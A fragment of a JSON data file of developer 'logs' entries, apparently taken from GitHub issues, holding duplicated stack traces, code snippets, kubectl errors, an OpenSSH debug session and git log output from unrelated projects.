        "logs": "Error: Given input \"NaN\" is not a number.\r\n    at Object.numberToHex (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-utils/src/utils.js:273:15)\r\n    at Method.inputBlockNumberFormatter (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-helpers/src/formatters.js:124:125)\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:150:38\r\n    at Array.map (<anonymous>)\r\n    at Method.formatInput (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:148:32)\r\n    at Method.toPayload (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:183:23)\r\n    at Eth.send [as getBlock] (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:617:30)\r\n    at ForkedBlockchain.getFallbackBlock (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:357:17)\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:411:19\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:312:5\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:777:5\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/blockchain_double.js:204:5\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/database/blockserializer.js:45:9\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/async/dist/async.js:473:16\r\n    at replenish (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/async/dist/async.js:1006:25)\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/async/dist/async.js:1016:9"
    },
    {
        "logs": "Error: Given input \"NaN\" is not a number.\r\n    at Object.numberToHex (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-utils/src/utils.js:273:15)\r\n    at Method.inputBlockNumberFormatter (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-helpers/src/formatters.js:124:125)\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:150:38\r\n    at Array.map (<anonymous>)\r\n    at Method.formatInput (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:148:32)\r\n    at Method.toPayload (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:183:23)\r\n    at Eth.send [as getBlock] (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:617:30)\r\n    at ForkedBlockchain.getFallbackBlock (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:357:17)\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:411:19\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:312:5\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:777:5\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/blockchain_double.js:204:5\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/database/blockserializer.js:45:9\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/async/dist/async.js:473:16\r\n    at replenish (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/async/dist/async.js:1006:25)\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/async/dist/async.js:1016:9"
    },
    {
        "logs": " class CompletionItemProvider {\r\n  provideCompletionItems(\r\n    document: vscode.TextDocument,\r\n    position: vscode.Position,\r\n    token: vscode.CancellationToken,\r\n    context: vscode.CompletionContext\r\n  ) {\r\n    // \u652f\u6301\u6362\u884c \u4ee3\u7801\u4ece\u8d77\u59cb\u4f4d\u7f6e\u5230\u8f93\u5165\u4f4d\u7f6e\r\n    const text = document.getText();\r\n  \r\n    let completionItems: vscode.CompletionItem[] = [];\r\n   \r\n    createServer({\r\n      rootUri: null,\r\n      publishDiagnostics: () => {},\r\n    }).then((v) => {\r\n      // v.didChangeConfiguration({\r\n      //   settings: {\r\n      //     completions: {\r\n      //       completeFunctionCalls: true,\r\n      //     },\r\n      //   },\r\n      // });\r\n     v.completion({\r\n          textDocument: {\r\n            uri: \"~/Users/mac/yiyao_fe_shennong/src/utils/util.ts\",\r\n          },\r\n          position: position,\r\n        })\r\n        .then((q) => {\r\n          console.log(q,'qqqq');\r\n        });\r\n    });\r\n\r\n    \r\n\r\n    return completionItems;\r\n  \r\n  }\r\n  \r\n}"
    },
    {
        "logs": " class CompletionItemProvider {\r\n  provideCompletionItems(\r\n    document: vscode.TextDocument,\r\n    position: vscode.Position,\r\n    token: vscode.CancellationToken,\r\n    context: vscode.CompletionContext\r\n  ) {\r\n    // \u652f\u6301\u6362\u884c \u4ee3\u7801\u4ece\u8d77\u59cb\u4f4d\u7f6e\u5230\u8f93\u5165\u4f4d\u7f6e\r\n    const text = document.getText();\r\n  \r\n    let completionItems: vscode.CompletionItem[] = [];\r\n   \r\n    createServer({\r\n      rootUri: null,\r\n      publishDiagnostics: () => {},\r\n    }).then((v) => {\r\n      // v.didChangeConfiguration({\r\n      //   settings: {\r\n      //     completions: {\r\n      //       completeFunctionCalls: true,\r\n      //     },\r\n      //   },\r\n      // });\r\n     v.completion({\r\n          textDocument: {\r\n            uri: \"~/Users/mac/yiyao_fe_shennong/src/utils/util.ts\",\r\n          },\r\n          position: position,\r\n        })\r\n        .then((q) => {\r\n          console.log(q,'qqqq');\r\n        });\r\n    });\r\n\r\n    \r\n\r\n    return completionItems;\r\n  \r\n  }\r\n  \r\n}"
    },
    {
        "logs": "ArgumentNullException: Value cannot be null. Parameter name: entityType\r\n\r\n    Microsoft.EntityFrameworkCore.Utilities.Check.NotNull<T>(T value, string parameterName)\r\n    Microsoft.EntityFrameworkCore.SqlServerMetadataExtensions.SqlServer(IEntityType entityType)\r\n    Audit.EntityFramework.DbContextHelper.GetEntityName(IEntityType entityType)\r\n    Audit.EntityFramework.DbContextHelper.CreateAuditEvent(IAuditDbContext context)\r\n    Audit.EntityFramework.DbContextHelper+<SaveChangesAsync>d__26.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    Audit.EntityFramework.AuditDbContext+<SaveChangesAsync>d__32.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    MyCode.MyDbContext+<SaveChangesAsync>d__6.MoveNext() in MyDbContext.cs\r\n\r\n                return await base.SaveChangesAsync();"
    },
    {
        "logs": "ArgumentNullException: Value cannot be null. Parameter name: entityType\r\n\r\n    Microsoft.EntityFrameworkCore.Utilities.Check.NotNull<T>(T value, string parameterName)\r\n    Microsoft.EntityFrameworkCore.SqlServerMetadataExtensions.SqlServer(IEntityType entityType)\r\n    Audit.EntityFramework.DbContextHelper.GetEntityName(IEntityType entityType)\r\n    Audit.EntityFramework.DbContextHelper.CreateAuditEvent(IAuditDbContext context)\r\n    Audit.EntityFramework.DbContextHelper+<SaveChangesAsync>d__26.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    Audit.EntityFramework.AuditDbContext+<SaveChangesAsync>d__32.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    MyCode.MyDbContext+<SaveChangesAsync>d__6.MoveNext() in MyDbContext.cs\r\n\r\n                return await base.SaveChangesAsync();"
    },
    {
        "logs": "    private function request($requestType, $attributes = array(), $parameters = array(), $delegate = false, $delegateType = 'Mail', $retryOnExpiredAuth = true)\r\n    {\r\n        try {\r\n            $request = $this->buildRequest($requestType, $attributes, $parameters, $delegate, $delegateType);\r\n            $response = $this->submitRequest($request);\r\n            $response = $response['soap:Envelope']['soap:Body'][$requestType . 'Response'];\r\n        } catch (SoapFaultException $e) {\r\n            if ($e->getMessage() == 'Zimbra Soap Fault: auth credentials have expired' && $retryOnExpiredAuth) {\r\n                $this->login();\r\n                $response = $this->request($requestType, $attributes, $parameters, $delegate, $delegateType, false);\r\n            } else {\r\n\r\n                throw $e;\r\n            }\r\n        }\r\n\r\n        return $response;\r\n    }"
    },
    {
        "logs": "    private function request($requestType, $attributes = array(), $parameters = array(), $delegate = false, $delegateType = 'Mail', $retryOnExpiredAuth = true)\r\n    {\r\n        try {\r\n            $request = $this->buildRequest($requestType, $attributes, $parameters, $delegate, $delegateType);\r\n            $response = $this->submitRequest($request);\r\n            $response = $response['soap:Envelope']['soap:Body'][$requestType . 'Response'];\r\n        } catch (SoapFaultException $e) {\r\n            if ($e->getMessage() == 'Zimbra Soap Fault: auth credentials have expired' && $retryOnExpiredAuth) {\r\n                $this->login();\r\n                $response = $this->request($requestType, $attributes, $parameters, $delegate, $delegateType, false);\r\n            } else {\r\n\r\n                throw $e;\r\n            }\r\n        }\r\n\r\n        return $response;\r\n    }"
    },
    {
        "logs": "    ngAfterViewInit() {\r\n        let webView: WebView = this.webViewRef.nativeElement;\r\n\r\n        webView.on(WebView.loadStartedEvent, function() {\r\n            webView.android.getSettings().setBuiltInZoomControls(true);\r\n            webView.android.getSettings().setDisplayZoomControls(false);\r\n            webView.android.setWebContentsDebuggingEnabled(true);\r\n        });\r\n\r\n        webView.on(WebView.loadFinishedEvent, function (args: LoadEventData) {\r\n            let message;\r\n            if (!args.error) {\r\n                message = 'WebView finished loading of ' + args.url;\r\n            } else {\r\n                message = 'Error loading ' + args.url + ': ' + args.error;\r\n            }\r\n\r\n            console.log('WebView message - ' + message);\r\n        });\r\n    }"
    },
    {
        "logs": "Error creating: Internal error occurred: failed calling webhook \"sidecar-injector.istio.io\": Post https: //istio-sidecar-injector.istio-system.svc:443/inject?timeout=30s: net/http: request canceled while waiting for connection (Client.Timeout exceeded while await ing headers)"
    },
    {
        "logs": "Error from server (Timeout): error when creating \"STDIN\": Timeout: request did not complete within requested timeout 30s"
    },
    {
        "logs": "System.InvalidOperationException: Could not find the JSON path of a referenced schema: Manually referenced schemas must be added to the 'Definitions' of a parent schema.\r\n   at IReadOnlyDictionary<object, string> NJsonSchema.JsonPathUtilities.GetJsonPaths(object rootObject, IEnumerable<object> searchedObjects, IContractResolver contractResolver)\r\n   at void NJsonSchema.JsonSchemaReferenceUtilities.UpdateSchemaReferencePaths(object rootObject, bool removeExternalReferences, IContractResolver contractResolver)\r\n   at string NJsonSchema.Infrastructure.JsonSchemaSerialization.ToJson(object obj, SchemaType schemaType, IContractResolver contractResolver, Formatting formatting)\r\n   at string NSwag.OpenApiDocument.ToJson(SchemaType schemaType, Formatting formatting)\r\n   at async Task<string> NSwag.AspNetCore.Middlewares.OpenApiDocumentMiddleware.GetDocumentAsync(HttpContext context)\r\n   at async Task NSwag.AspNetCore.Middlewares.OpenApiDocumentMiddleware.Invoke(HttpContext context)\r\n   at async Task Microsoft.AspNetCore.Routing.EndpointMiddleware.Invoke(HttpContext httpContext)\r\n   at async Task Microsoft.AspNetCore.Routing.EndpointRoutingMiddleware.Invoke(HttpContext httpContext)\r\n   at async Task Microsoft.AspNetCore.Server.Kestrel.Core.Internal.Http.HttpProtocol.ProcessRequests<TContext>(IHttpApplication<TContext> application)"
    },
    {
        "logs": "System.InvalidOperationException: Could not find the JSON path of a referenced schema: Manually referenced schemas must be added to the 'Definitions' of a parent schema.\r\n   at IReadOnlyDictionary<object, string> NJsonSchema.JsonPathUtilities.GetJsonPaths(object rootObject, IEnumerable<object> searchedObjects, IContractResolver contractResolver)\r\n   at void NJsonSchema.JsonSchemaReferenceUtilities.UpdateSchemaReferencePaths(object rootObject, bool removeExternalReferences, IContractResolver contractResolver)\r\n   at string NJsonSchema.Infrastructure.JsonSchemaSerialization.ToJson(object obj, SchemaType schemaType, IContractResolver contractResolver, Formatting formatting)\r\n   at string NSwag.OpenApiDocument.ToJson(SchemaType schemaType, Formatting formatting)\r\n   at async Task<string> NSwag.AspNetCore.Middlewares.OpenApiDocumentMiddleware.GetDocumentAsync(HttpContext context)\r\n   at async Task NSwag.AspNetCore.Middlewares.OpenApiDocumentMiddleware.Invoke(HttpContext context)\r\n   at async Task Microsoft.AspNetCore.Routing.EndpointMiddleware.Invoke(HttpContext httpContext)\r\n   at async Task Microsoft.AspNetCore.Routing.EndpointRoutingMiddleware.Invoke(HttpContext httpContext)\r\n   at async Task Microsoft.AspNetCore.Server.Kestrel.Core.Internal.Http.HttpProtocol.ProcessRequests<TContext>(IHttpApplication<TContext> application)"
    },
    {
        "logs": " \"fresh\" so I can't remember all the changes I needed to make... and I'm not familiar with the iTerm2 code base, but [a quick search through the source](https://github.com/username_3/iTerm2/blob/master/sources/iTermProfilePreferences.m#L386), indicates the default for this setting may be "
    },
    {
        "logs": "Invalid value: v1.LabelSelector{MatchLabels:map[string]string{\"app\":\"ml-pipeline-viewer-crd\", \"app.kubernetes.io/component\":\"pipelines-viewer\", \"app.kubernetes.io/name\":\"pipelines-viewer\", \"kapp.k14s.io/a$\r\np\":\"1598878090435084849\"}, MatchExpressions:[]v1.LabelSelectorRequirement(nil)}: field is immutable (reason: Invalid)"
    },
    {
        "logs": "Invalid value: v1.LabelSelector{MatchLabels:map[string]string{\"app\":\"ml-pipeline-viewer-crd\", \"app.kubernetes.io/component\":\"pipelines-viewer\", \"app.kubernetes.io/name\":\"pipelines-viewer\", \"kapp.k14s.io/a$\r\np\":\"1598878090435084849\"}, MatchExpressions:[]v1.LabelSelectorRequirement(nil)}: field is immutable (reason: Invalid)"
    },
    {
        "logs": "  task automatic csr_rd(input  uvm_object     ptr, // accept reg or field\r\n                        output uvm_reg_data_t value,\r\n                        input  uvm_check_e    check = UVM_CHECK,\r\n                        input  uvm_path_e     path = UVM_DEFAULT_PATH,\r\n                        input  bit            blocking = default_csr_blocking,\r\n                        input  bit            backdoor = 0,\r\n                        input  uint           timeout_ns = default_timeout_ns,\r\n                        input  uvm_reg_map    map = null);\r\n    if (backdoor) begin\r\n        csr_peek(ptr, value, check);\r\n    end else if (blocking) begin\r\n      csr_rd_sub(ptr, value, check, path, timeout_ns, map);\r\n    end else begin\r\n      fork\r\n        csr_rd_sub(ptr, value, check, path, timeout_ns, map);\r\n      join_none\r\n      // Add #0 to ensure that this thread starts executing before any subsequent call\r\n      #0;\r\n    end\r\n  endtask"
    },
    {
        "logs": "  task automatic csr_rd(input  uvm_object     ptr, // accept reg or field\r\n                        output uvm_reg_data_t value,\r\n                        input  uvm_check_e    check = UVM_CHECK,\r\n                        input  uvm_path_e     path = UVM_DEFAULT_PATH,\r\n                        input  bit            blocking = default_csr_blocking,\r\n                        input  bit            backdoor = 0,\r\n                        input  uint           timeout_ns = default_timeout_ns,\r\n                        input  uvm_reg_map    map = null);\r\n    if (backdoor) begin\r\n        csr_peek(ptr, value, check);\r\n    end else if (blocking) begin\r\n      csr_rd_sub(ptr, value, check, path, timeout_ns, map);\r\n    end else begin\r\n      fork\r\n        csr_rd_sub(ptr, value, check, path, timeout_ns, map);\r\n      join_none\r\n      // Add #0 to ensure that this thread starts executing before any subsequent call\r\n      #0;\r\n    end\r\n  endtask"
    },
    {
        "logs": "{\r\n    'executionArn': 'string',\r\n    'stateMachineArn': 'string',\r\n    'name': 'string',\r\n    'status': 'RUNNING'|'SUCCEEDED'|'FAILED'|'TIMED_OUT'|'ABORTED',\r\n    'startDate': datetime(2015, 1, 1),\r\n    'stopDate': datetime(2015, 1, 1),\r\n    'input': 'string',\r\n    'output': 'string'\r\n}"
    },
    {
        "logs": "### Build Logs\r\n\r\n<!--\r\n1. Place cursor below this comment block.\r\n2. Attach build log or link to gist (https://gist.github.com/) of the log.\r\n3. Logs can be found in the Build Output tab of the Errors pad in Visual Studio\r\nTo get full build logs, set the log verbosity to diagnostic at the following locations:\r\n- On Visual Studio for Mac: Preferences > Projects > Build\r\n- On Visual Studio for Windows: Tools > Options > Projects and Solutions > Build and Run\r\nOn Visual Studio for Windows you also want to add "
    },
    {
        "logs": "  File \"/workspaces/home-assistant-core/homeassistant/components/overkiz/sensor.py\", line 56, in <lambda>\r\n    native_value=lambda value: int(str(value).strip(\"%\")),\r\nValueError: invalid literal for int() with base 10: '59.0'"
    },
    {
        "logs": "  File \"/workspaces/home-assistant-core/homeassistant/components/overkiz/sensor.py\", line 56, in <lambda>\r\n    native_value=lambda value: int(str(value).strip(\"%\")),\r\nValueError: invalid literal for int() with base 10: '59.0'"
    },
    {
        "logs": "$ kubectl --kubeconfig=/home/sonyali/go/src/k8s.io/arktos/cluster/kubeconfig-proxy get pods -A -o wide | grep flannel\r\nkube-system   kube-flannel-ds-ck9nx                                   467230830100771799    0/1     CrashLoopBackOff    5          6m19s   10.40.0.4   sonyaperf2-012722-rp-1-minion-group-819s   <none>           <none>\r\nkube-system   kube-flannel-ds-hdv2v                                   4889372435816231445   0/1     CrashLoopBackOff    6          12m     10.40.0.2   sonyaperf2-012722-tp-1-master              <none>           <none>\r\nkube-system   kube-flannel-ds-thf24                                   6761946374700889854   0/1     CrashLoopBackOff    4          6m19s   10.40.0.3   sonyaperf2-012722-rp-1-master              <none>           <none>\r\nkube-system   kube-flannel-ds-wcmz9                                   6355461902304453693   0/1     CrashLoopBackOff    5          6m19s   10.40.0.5   sonyaperf2-012722-rp-1-minion-group-97v8   <none>           <none>"
    },
    {
        "logs": "$ kubectl --kubeconfig=/home/sonyali/go/src/k8s.io/arktos/cluster/kubeconfig-proxy get pods -A -o wide | grep flannel\r\nkube-system   kube-flannel-ds-ck9nx                                   467230830100771799    0/1     CrashLoopBackOff    5          6m19s   10.40.0.4   sonyaperf2-012722-rp-1-minion-group-819s   <none>           <none>\r\nkube-system   kube-flannel-ds-hdv2v                                   4889372435816231445   0/1     CrashLoopBackOff    6          12m     10.40.0.2   sonyaperf2-012722-tp-1-master              <none>           <none>\r\nkube-system   kube-flannel-ds-thf24                                   6761946374700889854   0/1     CrashLoopBackOff    4          6m19s   10.40.0.3   sonyaperf2-012722-rp-1-master              <none>           <none>\r\nkube-system   kube-flannel-ds-wcmz9                                   6355461902304453693   0/1     CrashLoopBackOff    5          6m19s   10.40.0.5   sonyaperf2-012722-rp-1-minion-group-97v8   <none>           <none>"
    },
    {
        "logs": "debug(debug($this->request->data));\r\n[\r\n\r\n\t'image' => [\r\n\t\t'name' => 'name.jpg',\r\n\t\t'type' => 'image/jpeg',\r\n\t\t'tmp_name' => '/tmp/tmp_name',\r\n\t\t'error' => (int) 0,\r\n\t\t'size' => (int) 22222\r\n\t],\r\n        'other'=>'sample'\r\n]"
    },
    {
        "logs": "debug(debug($this->request->data));\r\n[\r\n\r\n\t'image' => [\r\n\t\t'name' => 'name.jpg',\r\n\t\t'type' => 'image/jpeg',\r\n\t\t'tmp_name' => '/tmp/tmp_name',\r\n\t\t'error' => (int) 0,\r\n\t\t'size' => (int) 22222\r\n\t],\r\n        'other'=>'sample'\r\n]"
    },
    {
        "logs": "series([1,2,3,4].map((n) => {\r\n  return async () => new Promise((resolve) => {\r\n    console.log(n)\r\n    setTimeout(() => resolve(n), 1000)\r\n  })\r\n}))"
    },
    {
        "logs": "series([1,2,3,4].map((n) => {\r\n  return async () => new Promise((resolve) => {\r\n    console.log(n)\r\n    setTimeout(() => resolve(n), 1000)\r\n  })\r\n}))"
    },
    {
        "logs": "debug2: load_server_config: filename /etc/ssh/sshd_config\r\ndebug2: load_server_config: done config len = 837\r\ndebug2: parse_server_config: config /etc/ssh/sshd_config len 837\r\ndebug1: sshd version OpenSSH_6.9, OpenSSL 1.0.2d 9 Jul 2015\r\ndebug1: private host key #0: ssh-rsa SHA256:---\r\ndebug1: private host key #1: ssh-dss SHA256::---\r\ndebug1: private host key #2: ecdsa-sha2-nistp256 SHA256:---\r\ndebug1: private host key #3: ssh-ed25519 SHA256::---\r\ndebug1: rexec_argv[0]='/usr/sbin/sshd'\r\ndebug1: rexec_argv[1]='-p'\r\ndebug1: rexec_argv[2]='22222'\r\ndebug1: rexec_argv[3]='-D'\r\ndebug1: rexec_argv[4]='-dd'\r\ndebug1: rexec_argv[5]='-e'\r\nSet /proc/self/oom_score_adj from 0 to -1000\r\ndebug2: fd 3 setting O_NONBLOCK\r\ndebug1: Bind to port 22222 on 0.0.0.0.\r\nServer listening on 0.0.0.0 port 22222.\r\ndebug2: fd 4 setting O_NONBLOCK\r\ndebug1: Bind to port 22222 on ::.\r\nServer listening on :: port 22222.\r\ndebug1: Server will not fork when running in debugging mode.\r\ndebug1: rexec start in 5 out 5 newsock 5 pipe -1 sock 8\r\ndebug2: parse_server_config: config rexec len 837\r\ndebug1: sshd version OpenSSH_6.9, OpenSSL 1.0.2d 9 Jul 2015\r\ndebug1: private host key #0: ssh-rsa SHA256:---\r\ndebug1: private host key #1: ssh-dss SHA256:---\r\ndebug1: private host key #2: ecdsa-sha2-nistp256 SHA256:/Wo5b8YKQRrx8z22h7k1ApmG0B6Wsnkk0/Nmi0d2ghQ\r\ndebug1: private host key #3: ssh-ed25519 SHA256:/Wo5b8YKQRrx8z22h7k1ApmG0B6Wsnkk0/Nmi0d2ghQ\r\ndebug1: inetd sockets after dupping: 3, 3\r\nConnection from 123.123.123.123 port 44694 on 172.31.1.100 port 22222\r\ndebug1: Client protocol version 2.0; client software version Go\r\ndebug1: no match: Go\r\ndebug1: Enabling compatibility mode for protocol 2.0\r\ndebug1: Local version string SSH-2.0-OpenSSH_6.9p1 Ubuntu-2ubuntu0.2\r\ndebug2: fd 3 setting O_NONBLOCK\r\ndebug2: Network child is on pid 14539\r\ndebug1: permanently_set_uid: 107/65534 [preauth]\r\ndebug1: list_hostkey_types: ssh-rsa,ssh-dss,ecdsa-sha2-nistp256,ssh-ed25519 [preauth]\r\ndebug1: SSH2_MSG_KEXINIT sent [preauth]\r\ndebug1: SSH2_MSG_KEXINIT received [preauth]\r\ndebug2: kex_parse_kexinit: curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1 [preauth]\r\ndebug2: kex_parse_kexinit: ssh-rsa,ssh-dss,ecdsa-sha2-nistp256,ssh-ed25519 [preauth]\r\ndebug2: kex_parse_kexinit: chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com [preauth]\r\ndebug2: kex_parse_kexinit: chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com [preauth]\r\ndebug2: kex_parse_kexinit: umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1 [preauth]\r\ndebug2: kex_parse_kexinit: umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1 [preauth]\r\ndebug2: kex_parse_kexinit: none,zlib@openssh.com [preauth]\r\ndebug2: kex_parse_kexinit: none,zlib@openssh.com [preauth]\r\ndebug2: kex_parse_kexinit:  [preauth]\r\ndebug2: kex_parse_kexinit:  [preauth]\r\ndebug2: kex_parse_kexinit: first_kex_follows 0  [preauth]\r\ndebug2: kex_parse_kexinit: reserved 0  [preauth]\r\ndebug2: kex_parse_kexinit: curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 [preauth]\r\ndebug2: kex_parse_kexinit: ssh-rsa-cert-v01@openssh.com,ssh-dss-cert-v01@openssh.com,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-rsa,ssh-dss,ssh-ed25519 [preauth]\r\ndebug2: kex_parse_kexinit: aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,arcfour256,arcfour128 [preauth]\r\ndebug2: kex_parse_kexinit: aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,arcfour256,arcfour128 [preauth]\r\ndebug2: kex_parse_kexinit: hmac-sha2-256,hmac-sha1,hmac-sha1-96 [preauth]\r\ndebug2: kex_parse_kexinit: hmac-sha2-256,hmac-sha1,hmac-sha1-96 [preauth]\r\ndebug2: kex_parse_kexinit: none [preauth]\r\ndebug2: kex_parse_kexinit: none [preauth]\r\ndebug2: kex_parse_kexinit:  [preauth]\r\ndebug2: kex_parse_kexinit:  [preauth]\r\ndebug2: kex_parse_kexinit: first_kex_follows 0  [preauth]\r\ndebug2: kex_parse_kexinit: reserved 0  [preauth]\r\ndebug1: kex: client->server aes128-ctr hmac-sha2-256 none [preauth]\r\ndebug1: kex: server->client aes128-ctr hmac-sha2-256 none [preauth]\r\ndebug1: expecting SSH2_MSG_KEX_ECDH_INIT [preauth]\r\ndebug2: monitor_read: 6 used once, disabling now\r\ndebug2: set_newkeys: mode 1 [preauth]\r\ndebug1: SSH2_MSG_NEWKEYS sent [preauth]\r\ndebug1: expecting SSH2_MSG_NEWKEYS [preauth]\r\ndebug2: set_newkeys: mode 0 [preauth]\r\ndebug1: SSH2_MSG_NEWKEYS received [preauth]\r\ndebug1: KEX done [preauth]\r\ndispatch_protocol_error: type 20 seq 3 [preauth]\r\nConnection closed by 123.123.123.123 [preauth]\r\ndebug1: do_cleanup [preauth]\r\ndebug1: monitor_read_log: child log fd closed\r\ndebug1: do_cleanup\r\ndebug1: Killing privsep child 14539\r\ndebug1: audit_event: unhandled event 12"
    },
    {
        "logs": "$ git log -1\r\ncommit aa3b07422c46d5e11a7ee4b7236230b4b2dfbbea\r\nAuthor: Adam Grare <username_1@redhat.com>\r\nDate:   Thu Nov 29 08:50:41 2018 -0500\r\n\r\n    Merge pull request #18230 from username_0/rfe/upgrade_cluster_role_options\r\n    \r\n    Add job_timeout parameter for upgrade_cluster\r\n    \r\n    (cherry picked from commit 0e1006bce4c40edaa7059247886ad08524f97b8c)\r\n    \r\n    https://bugzilla.redhat.com/show_bug.cgi?id=1644605"
    },
    {
        "logs": "$ git log -1\r\ncommit aa3b07422c46d5e11a7ee4b7236230b4b2dfbbea\r\nAuthor: Adam Grare <username_1@redhat.com>\r\nDate:   Thu Nov 29 08:50:41 2018 -0500\r\n\r\n    Merge pull request #18230 from username_0/rfe/upgrade_cluster_role_options\r\n    \r\n    Add job_timeout parameter for upgrade_cluster\r\n    \r\n    (cherry picked from commit 0e1006bce4c40edaa7059247886ad08524f97b8c)\r\n    \r\n    https://bugzilla.redhat.com/show_bug.cgi?id=1644605"
    },
    {
        "logs": " option. See the [readme](https://github.com/accounts-js/accounts/blob/1af9dc6a7d80dee5818b8e778f1277cdbd9ed301/packages/nestjs/README.md) for a run down.\r\n- As for Graphql context and figuring out which is which, I was trying to develop somethigng that could be used by the nest community. But see this line for a comment on how nest is handling this internally soon https://github.com/accounts-js/accounts/blob/1af9dc6a7d80dee5818b8e778f1277cdbd9ed301/packages/nestjs/src/guards/Auth.guard.ts#L10 the only issue is that @nestjs/graphql doesn't have the necessary updates yet.\r\n- TypeORM connection - Sure! you can use the OptionsFactory option to break out the nestjs-accounts options into a class. Then you can [inject the typeorm connection with "
    },
    {
        "logs": "$ npm run hugo\r\nnpm ERR! missing script: hugo\r\n$ hugo\r\nError: Unable to locate Config file. Perhaps you need to create a new site.\r\n       Run "
    },
    {
        "logs": "$ npm run hugo\r\nnpm ERR! missing script: hugo\r\n$ hugo\r\nError: Unable to locate Config file. Perhaps you need to create a new site.\r\n       Run `hugo help new` for details."
    },
    {
